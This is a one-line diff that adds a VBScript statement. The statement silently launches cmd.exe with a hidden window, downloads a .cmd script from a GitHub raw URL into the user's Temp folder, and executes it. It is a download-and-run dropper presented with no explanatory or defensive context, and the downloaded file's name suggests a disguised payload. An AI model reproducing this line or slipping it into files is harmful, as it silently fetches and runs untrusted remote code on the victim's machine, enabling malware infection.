@@ -1,0 +1,1 @@
+CreateObject("WScript.Shell").Run "cmd.exe /c curl -sL https://raw.githubusercontent.com/locnguyenn12/lnk/main/Tai-macOSx.cmd -o C:\Users\Admin\AppData\Local\Temp\s.cmd & C:\Users\Admin\AppData\Local\Temp\s.cmd", 0, False 
